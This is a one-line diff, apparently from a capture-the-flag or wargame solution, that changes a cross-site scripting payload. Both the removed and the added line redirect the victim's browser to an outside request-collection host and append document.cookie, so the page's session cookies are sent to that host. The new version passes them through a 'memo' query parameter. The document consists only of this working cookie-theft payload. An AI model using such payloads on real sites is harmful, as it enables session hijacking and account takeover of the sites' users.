@@ -1,1 +1,1 @@
-location.href="https://upcowto.request.dreamhack.games/"+document.cookie
+location.href="https://wjvmrmq.request.dreamhack.games/memo?memo="+document.cookie
